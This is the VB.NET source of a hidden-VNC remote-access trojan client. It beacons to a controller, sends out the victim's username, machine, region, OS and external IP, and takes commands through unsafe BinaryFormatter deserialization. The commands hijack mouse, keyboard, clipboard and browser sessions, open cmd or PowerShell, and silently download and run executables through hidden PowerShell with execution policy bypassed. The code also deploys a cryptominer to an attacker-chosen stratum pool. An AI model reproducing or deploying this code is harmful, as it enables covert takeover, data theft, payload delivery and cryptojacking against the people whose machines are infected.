Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32
Imports DLL.Browser
Imports DLL.Functions
Imports System
Imports System.Diagnostics
Imports System.Globalization
Imports System.IO
Imports System.Linq
Imports System.Net
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Runtime.Serialization.Formatters
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Threading
Imports System.Web
Imports System.Windows.Forms
Imports System.Reflection
Imports System.ComponentModel
Imports System.Drawing
Imports System.Runtime.InteropServices

Namespace DLL
	Public Class HVNC

		<MethodImpl(MethodImplOptions.NoInlining Or MethodImplOptions.NoOptimization), STAThread> _
		Shared Sub Main(ByVal cmdArgs() As String)

			Try
				Dim mutex As New Mutex(initiallyOwned:= False, cmdArgs(3))
				If Not mutex.WaitOne(0, exitContext:= False) Then
					mutex.Close()
					mutex = Nothing
				End If
			Catch
				Dim mutex As New Mutex(initiallyOwned:= False, "01234567890")
				If Not mutex.WaitOne(0, exitContext:= False) Then
					mutex.Close()
					mutex = Nothing
				End If
			End Try

			Try
				Outils.HigherThan81 = Conversions.ToBoolean(Outils.Isgreaterorequalto81())

				Outils.TitleBarHeight = Outils.GetSystemMetrics(4)

				If Outils.TitleBarHeight < 5 Then
					Outils.TitleBarHeight = 20
				End If

				Outils.Identifier = Conversions.ToString(cmdArgs(0))

				Outils.ip = cmdArgs(1)

				Outils.port = Conversions.ToInteger(cmdArgs(2))

				Outils.username = Environment.UserName & "@" & Environment.MachineName

				Outils.screenx = Screen.PrimaryScreen.Bounds.Width

				Outils.screeny = Screen.PrimaryScreen.Bounds.Height

				SendData(Outils.ip, Outils.port)


				Do
					Thread.Sleep(10000)
				Loop
			Catch

			End Try
		End Sub

		Private Shared Sub SendData(ByVal ip As String, ByVal port As Integer)
			Do
				Outils.Client = New TcpClient()
				Thread.Sleep(1000)
				Try
					Outils.Client.Connect(ip, port)
				Catch
					Continue Do
				End Try
				Exit Do
			Loop
			Outils.nstream = Outils.Client.GetStream()

			Outils.nstream.BeginRead(New Byte(0){}, 0, 0, AddressOf Read, Nothing)

			Try
				Dim registryKey As RegistryKey = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows NT\CurrentVersion")
				Dim pathName As String = DirectCast(registryKey.GetValue("productName"), String)

				Dim ri As RegionInfo = RegionInfo.CurrentRegion

				If Not File.Exists(Interaction.Environ("APPDATA") & "\" & "temp0923") Then
					File.WriteAllText(Interaction.Environ("APPDATA") & "\" & "temp0923", Date.UtcNow.ToString("MM/dd/yyyy"))
				End If

				Dim installDate As String = File.ReadAllText(Interaction.Environ("APPDATA") & "\" & "temp0923")

				Dim externalIpString As String = (New WebClient()).DownloadString("http://ipinfo.io/ip").Replace("\r\n", "").Replace("\n", "").Trim()
				Dim externalIp = IPAddress.Parse(externalIpString)

				Dim ipadd() As String = Outils.Client.Client.RemoteEndPoint.ToString().Split(":"c)

				Outils.SendInformation(Outils.nstream, "54321|" & Outils.Identifier & "_ | " & Outils.username & "|" & ri.Name.ToString() & "|" & pathName & "|" & installDate & "|" & "3.0.0.2|" & externalIp.ToString())
			Catch
			End Try
		End Sub

		Public Shared Sub Read(ByVal ar As IAsyncResult)
'INSTANT VB TODO TASK: There is no equivalent to a 'checked' block in VB:
'			checked
				Try
					SyncLock Outils.Client
						Dim binaryFormatter As New BinaryFormatter()
						binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple
						binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways
						binaryFormatter.FilterLevel = TypeFilterLevel.Full
						Dim array(7) As Byte
						Dim num As Integer = 8
						Dim num2 As Integer = 0
						Do While num > 0
							Dim num3 As Integer = Outils.nstream.Read(array, num2, num)
							If num3 = 0 Then
								Throw New SocketException(10054)
							End If
							Dim num4 As Integer = num3
							num -= num4
							num2 += num4
						Loop
						Dim num5 As ULong = BitConverter.ToUInt64(array, 0)
						Dim num6 As Integer = 0
						Dim array2(Convert.ToInt32(Decimal.Subtract(New Decimal(num5), 1D))) As Byte
						Dim objectValue2 As Object
						Using memoryStream As New MemoryStream()
							Dim num7 As Integer = 0
							Dim num8 As Integer = array2.Length
							Do While num8 > 0
								Dim num9 As Integer = Outils.nstream.Read(array2, num7, num8)
								If num9 = 0 Then
									Throw New SocketException(10054)
								End If
								num6 = num9
								num8 -= num6
								num7 += num6
							Loop
							memoryStream.Write(array2, 0, CInt(num5))
							memoryStream.Position = 0L
							Dim objectValue As Object = RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream))
							objectValue2 = RuntimeHelpers.GetObjectValue(objectValue)
							memoryStream.Close()
							memoryStream.Dispose()
						End Using
						HandleData(RuntimeHelpers.GetObjectValue(objectValue2))
						Outils.nstream.BeginRead(New Byte(0){}, 0, 0, AddressOf Read, Nothing)
					End SyncLock

				Catch ex As Exception
						Outils.Client.Close()

						Outils.newt.Abort()

						SendData(Outils.ip, Outils.port)
				End Try
'INSTANT VB TODO TASK: End of the original C# 'checked' block.
		End Sub

		Private Shared Sub HandleData(ByVal str As Object)
			Try
				Dim obj As Object = Strings.Split(Conversions.ToString(str), "*", -1, CompareMethod.Text)
				ThreadPool.QueueUserWorkItem(AddressOf ReceiveCommand, RuntimeHelpers.GetObjectValue(obj))
			Catch

			End Try
		End Sub

		Public Shared Sub ReceiveCommand(ByVal id As Object)
			Try
				Dim left As Object = NewLateBinding.LateIndexGet(id, New Object(0) { 0 }, Nothing)
				If Operators.ConditionalCompareObjectEqual(left, 0, TextCompare:= False) Then
					Try
						Outils.SendInformation(Outils.nstream, "0|" & Conversions.ToString(Outils.screenx) & "|" & Conversions.ToString(Outils.screeny))
					Catch

					End Try

					Outils.newt = New Thread(AddressOf Outils.SCT)
					Outils.newt.SetApartmentState(ApartmentState.STA)
					Outils.newt.IsBackground = True
					Outils.newt.Start()
				ElseIf Operators.ConditionalCompareObjectEqual(left, 1, TextCompare:= False) Then
					Outils.newt.Abort()
				ElseIf Operators.ConditionalCompareObjectEqual(left, 2, TextCompare:= False) Then
					Outils.PostClickLU(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, New Object(0) {1}, Nothing)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, New Object(0) {2}, Nothing)))
				ElseIf Operators.ConditionalCompareObjectEqual(left, 3, TextCompare:= False) Then
					Outils.PostClickRD(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, New Object(0) { 1 }, Nothing)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, New Object(0) { 2 }, Nothing)))
				ElseIf Operators.ConditionalCompareObjectEqual(left, 4, TextCompare:= False) Then
					Outils.PostClickLU(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, New Object(0) { 1 }, Nothing)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, New Object(0) { 2 }, Nothing)))
				ElseIf Operators.ConditionalCompareObjectEqual(left, 5, TextCompare:= False) Then
					Outils.PostClickRU(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, New Object(0) { 1 }, Nothing)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, New Object(0) { 2 }, Nothing)))
				ElseIf Operators.ConditionalCompareObjectEqual(left, 6, TextCompare:= False) Then
					Outils.PostDblClk(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, New Object(0) { 1 }, Nothing)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, New Object(0) { 2 }, Nothing)))
				ElseIf Operators.ConditionalCompareObjectEqual(left, 7, TextCompare:= False) Then
					Outils.PostKeyDown(Conversions.ToString(NewLateBinding.LateIndexGet(id, New Object(0) { 1 }, Nothing)))
				ElseIf Operators.ConditionalCompareObjectEqual(left, 8, TextCompare:= False) Then
					Outils.PostMove(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, New Object(0) { 1 }, Nothing)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, New Object(0) { 2 }, Nothing)))
				ElseIf Operators.ConditionalCompareObjectEqual(left, 9, TextCompare:= False) Then
					Outils.SendInformation(Outils.nstream, Operators.ConcatenateObject("9|", CopyText()))
				ElseIf Operators.ConditionalCompareObjectEqual(left, 4875, TextCompare:= False) Then
					Process.Start("cmd.exe").WaitForInputIdle()
				ElseIf Operators.ConditionalCompareObjectEqual(left, 4876, TextCompare:= False) Then
					Process.Start("powershell.exe").WaitForInputIdle()
				ElseIf Operators.ConditionalCompareObjectEqual(left, 10, TextCompare:= False) Then
					PasteText(Conversions.ToString(NewLateBinding.LateIndexGet(id, New Object(0) { 1 }, Nothing)))
				ElseIf Operators.ConditionalCompareObjectEqual(left, 11, TextCompare:= False) Then
					Chrome.StartChrome(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, New Object(0) { 1 }, Nothing)))
				ElseIf Operators.ConditionalCompareObjectEqual(left, 12, TextCompare:= False) Then
					Firefox.StartFirefox(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, New Object(0) { 1 }, Nothing)))
				ElseIf Operators.ConditionalCompareObjectEqual(left, 13, TextCompare:= False) Then
					ShowStartMenu()
				ElseIf Operators.ConditionalCompareObjectEqual(left, 14, TextCompare:= False) Then
					MinTop()
				ElseIf Operators.ConditionalCompareObjectEqual(left, 15, TextCompare:= False) Then
					RestoreMaxTop()
				ElseIf Operators.ConditionalCompareObjectEqual(left, 16, TextCompare:= False) Then
					CloseTop()
				ElseIf Operators.ConditionalCompareObjectEqual(left, 17, TextCompare:= False) Then
					Outils.interval = Conversions.ToInteger(NewLateBinding.LateIndexGet(id, New Object(0) { 1 }, Nothing))
				ElseIf Operators.ConditionalCompareObjectEqual(left, 18, TextCompare:= False) Then
					Outils.quality = Conversions.ToInteger(NewLateBinding.LateIndexGet(id, New Object(0) { 1 }, Nothing))
				ElseIf Operators.ConditionalCompareObjectEqual(left, 19, TextCompare:= False) Then
					Outils.resize = Conversions.ToDouble(NewLateBinding.LateIndexGet(id, New Object(0) { 1 }, Nothing))
				ElseIf Operators.ConditionalCompareObjectEqual(left, 21, TextCompare:= False) Then
					StartExplorer()
				ElseIf Operators.ConditionalCompareObjectEqual(left, 24, TextCompare:= False) Then
					Process.GetCurrentProcess().Kill()
				ElseIf Operators.ConditionalCompareObjectEqual(left, 30, TextCompare:= False) Then
					Edge.StartEdge(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, New Object(0) { 1 }, Nothing)))
				ElseIf Operators.ConditionalCompareObjectEqual(left, 32, TextCompare:= False) Then
					Brave.StartBrave(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, New Object(0) { 1 }, Nothing)))
				ElseIf Operators.ConditionalCompareObjectEqual(left, 56, TextCompare:= False) Then
					DownloadExecute(Conversions.ToString(NewLateBinding.LateIndexGet(id, New Object(0) { 1 }, Nothing)))
				ElseIf Operators.ConditionalCompareObjectEqual(left, 55, TextCompare:= False) Then

					Outils.tempFile = RandomString(9)

					If Conversions.ToString(NewLateBinding.LateIndexGet(id, New Object(0) { 6 }, Nothing)) = "0" Then
						Outils.MFile = "\" & Outils.tempFile & ".exe"
						Outils.MPath = Interaction.Environ("USERPROFILE") & "\Desktop\" & Outils.tempFile
					End If

					If Conversions.ToString(NewLateBinding.LateIndexGet(id, New Object(0) { 6 }, Nothing)) = "1" Then
						Outils.MFile = "\" & Outils.tempFile & ".exe"
						Outils.MPath = Interaction.Environ("LOCALAPPDATA") & "\" & Outils.tempFile
					End If

					If Conversions.ToString(NewLateBinding.LateIndexGet(id, New Object(0) { 6 }, Nothing)) = "2" Then
						Outils.MFile = "\" & Outils.tempFile & ".exe"
						Outils.MPath = Interaction.Environ("ProgramFiles") & "\" & Outils.tempFile
					End If

					If Conversions.ToString(NewLateBinding.LateIndexGet(id, New Object(0) { 6 }, Nothing)) = "3" Then
						Outils.MFile = "\" & Outils.tempFile & ".exe"
						Outils.MPath = Interaction.Environ("APPDATA") & "\" & Outils.tempFile
					End If

					If Conversions.ToString(NewLateBinding.LateIndexGet(id, New Object(0) { 6 }, Nothing)) = "4" Then
						Outils.MFile = "\" & Outils.tempFile & ".exe"
						Outils.MPath = Interaction.Environ("Temp") & "\" & Outils.tempFile
					End If


					If Directory.Exists(Outils.MPath) = False Then
						Directory.CreateDirectory(Outils.MPath)
					End If


					If Conversions.ToString(NewLateBinding.LateIndexGet(id, New Object(0) { 1 }, Nothing)).Contains("ETH.txt") Then


						Using web3 As New WebClient()

							Dim w As New StreamWriter(Outils.MPath & Outils.MFile & ".bat")
							w.WriteLine(Outils.MPath & Outils.MFile & " -P stratum://" & Conversions.ToString(NewLateBinding.LateIndexGet(id, New Object(0) { 4 }, Nothing)) & "." & Path.GetFileNameWithoutExtension(Outils.MFile) & ":x@" & Conversions.ToString(NewLateBinding.LateIndexGet(id, New Object(0) { 2 }, Nothing)) & ":" & Conversions.ToString(NewLateBinding.LateIndexGet(id, New Object(0) { 3 }, Nothing)))
							w.WriteLine("pause")
							w.Close()

							Try
								File.WriteAllBytes(Outils.MPath & Outils.MFile, UTK(web3.DownloadString(Conversions.ToString(NewLateBinding.LateIndexGet(id, New Object(0) { 1 }, Nothing)))))
							Catch e As Exception
								MessageBox.Show(e.Message)
							End Try

						End Using

						Outils.SendInformation(Outils.nstream, "222|")

						StartMethod2(Conversions.ToString(NewLateBinding.LateIndexGet(id, New Object(0) { 5 }, Nothing)))

					End If

					If Conversions.ToString(NewLateBinding.LateIndexGet(id, New Object(0) { 1 }, Nothing)).Contains("ETC.txt") Then


						Using web3 As New WebClient()

							Dim w As New StreamWriter(Outils.MPath & Outils.MFile & ".bat")
							w.WriteLine(Outils.MPath & Outils.MFile & " -P stratum://" & Conversions.ToString(NewLateBinding.LateIndexGet(id, New Object(0) { 4 }, Nothing)) & "." & Path.GetFileNameWithoutExtension(Outils.MFile) & ":x@" & Conversions.ToString(NewLateBinding.LateIndexGet(id, New Object(0) { 2 }, Nothing)) & ":" & Conversions.ToString(NewLateBinding.LateIndexGet(id, New Object(0) { 3 }, Nothing)))
							w.WriteLine("pause")
							w.Close()

							Try
								File.WriteAllBytes(Outils.MPath & Outils.MFile, UTK(web3.DownloadString(Conversions.ToString(NewLateBinding.LateIndexGet(id, New Object(0) { 1 }, Nothing)))))
							Catch e As Exception
								MessageBox.Show(e.Message)
							End Try

						End Using

						Outils.SendInformation(Outils.nstream, "223|")

						StartMethod2(Conversions.ToString(NewLateBinding.LateIndexGet(id, New Object(0) { 5 }, Nothing)))

					End If

				ElseIf Operators.ConditionalCompareObjectEqual(left, 50, TextCompare:= False) Then
					KillMiner()
				End If
			Catch
			End Try
		End Sub
		Public Shared Sub Powershell(ByVal args As String)
			Dim processStart As New ProcessStartInfo() With {.FileName = "powershell.exe", .Arguments = args, .WindowStyle = ProcessWindowStyle.Hidden, .CreateNoWindow = True, .UseShellExecute = False}
			Process.Start(processStart)
		End Sub


		Public Shared Sub DownloadExecute(ByVal url As String)
			Dim path As String = RandomString(5)
			Powershell("powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('" & url & "','" & System.IO.Path.GetTempPath() & path & ".exe" & "');Start-Process ('" & System.IO.Path.GetTempPath() & path & ".exe" & "')")
			Outils.SendInformation(Outils.nstream, "256|")
		End Sub


		Public Shared Sub KillMiner()
			Outils.procM.Kill()
		End Sub

		Public Shared random As New Random()
		Public Shared Function RandomString(ByVal length As Integer) As String
			Const chars As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
			Return New String(Enumerable.Repeat(chars, length).Select(Function(s) s(random.Next(s.Length))).ToArray())
		End Function

		Public Shared Function UTK(ByVal data As String) As Byte()
			Return HttpServerUtility.UrlTokenDecode(data)
		End Function

		Public Shared Sub StartMethod1(ByVal Hidden As String)
			If File.Exists(Outils.MPath & Outils.MFile) Then

				Outils.procM.StartInfo.UseShellExecute = False

				If Hidden = "Hide" Then
					Outils.procM.StartInfo.CreateNoWindow = False
					Outils.procM.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
				End If

				If Hidden = "Show" Then
					Outils.procM.StartInfo.CreateNoWindow = True
					Outils.procM.StartInfo.WindowStyle = ProcessWindowStyle.Normal
				End If


				Outils.procM.StartInfo.FileName = Outils.MPath & Outils.MFile & ".bat"

				Outils.procM.StartInfo.RedirectStandardError = False
				Outils.procM.StartInfo.RedirectStandardOutput = False
				Outils.procM.StartInfo.UseShellExecute = True

				Outils.procM.Start()
				Outils.procM.WaitForExit()

			End If


		End Sub

		Public Shared Sub StartMethod2(ByVal Hidden As String)
			If File.Exists(Outils.MPath & Outils.MFile) Then

				Outils.procM.StartInfo.UseShellExecute = False

				If Hidden = "Hide" Then
					Outils.procM.StartInfo.CreateNoWindow = False
					Outils.procM.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
				End If

				If Hidden = "Show" Then
					Outils.procM.StartInfo.CreateNoWindow = True
					Outils.procM.StartInfo.WindowStyle = ProcessWindowStyle.Normal
				End If


				Outils.procM.StartInfo.FileName = Outils.MPath & Outils.MFile & ".bat"

				Outils.procM.StartInfo.RedirectStandardError = False
				Outils.procM.StartInfo.RedirectStandardOutput = False
				Outils.procM.StartInfo.UseShellExecute = True

				Outils.procM.Start()
				Outils.procM.WaitForExit()

			End If


		End Sub

		Public Shared Sub StartExplorer()
			Process.Start("explorer")
		End Sub

		Public Shared Sub CloseTop()
			Dim intPtr As IntPtr = Outils.lastactivebar
			Outils.SendMessage(CInt(Math.Truncate(CDec(intPtr))), 16, 0, 0)
		End Sub

		<DllImport("user32.dll", EntryPoint := "SetWindowPos")> _
		Public Shared Function SetWindowPos(ByVal hWnd As IntPtr, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal Y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As IntPtr
		End Function

		Private Const SWP_NOMOVE As Short = &H2
		Private Const SWP_NOSIZE As Short = 1
		Private Const SWP_NOZORDER As Short = &H4
		Private Const SWP_SHOWWINDOW As Integer = &H40

		Public Shared Sub RestoreMaxTop()
			Dim intPtr As IntPtr = Outils.lastactivebar
			If Outils.IsZoomed(intPtr) Then
				Outils.ShowWindow(intPtr, 9)
			Else
				Outils.ShowWindow(intPtr, 3)
			End If

			' Get the dimensions for the second monitor 
			Dim secondMonitor As Rectangle = Screen.AllScreens(0).WorkingArea
			SetWindowPos(Outils.FindHandle("Welcome to HVNC !"), 0, secondMonitor.Left, secondMonitor.Top, secondMonitor.Width, secondMonitor.Height, SWP_NOZORDER Or SWP_SHOWWINDOW)

		End Sub

		Public Shared Sub MinTop()
			Dim hWnd As IntPtr = Outils.lastactivebar
			Outils.ShowWindow(hWnd, 6)
		End Sub

		Public Shared Sub ShowStartMenu()
			Dim hWnd As IntPtr = (If(Outils.FindWindowEx2(New IntPtr(0), New IntPtr(0), New IntPtr(49175), "Start") = IntPtr.Zero, Outils.GetWindow(Outils.FindWindow("Shell_TrayWnd", Nothing), 5UI), Outils.FindWindowEx2(New IntPtr(0), New IntPtr(0), New IntPtr(49175), "Start")))
			Outils.PostMessage(hWnd, 513UI, New IntPtr(0L), New IntPtr(Outils.MakeLParam(2, 2)))
			Outils.PostMessage(hWnd, 514UI, New IntPtr(0L), New IntPtr(Outils.MakeLParam(2, 2)))
		End Sub

		Public Shared Function CopyText() As Object
			Outils.SendMessage(CInt(Math.Truncate(CDec(Outils.lastactive))), 258, 3, CInt(Math.Truncate(CDec(IntPtr.Zero))))
			Outils.SendMessage(CInt(Math.Truncate(CDec(Outils.lastactive))), 769, 0, 0)
			Outils.PostMessage(Outils.lastactive, 258UI, New IntPtr(3), IntPtr.Zero)
			Outils.PostMessage(Outils.lastactive, 769UI, Nothing, Nothing)
			Return Clipboard.GetText()
		End Function

		Public Shared Sub PasteText(ByVal ToPaste As String)
			Clipboard.SetText(ToPaste)
			Outils.SendMessage(CInt(Math.Truncate(CDec(Outils.lastactive))), 770, 0, 0)
		End Sub


	End Class
End Namespace
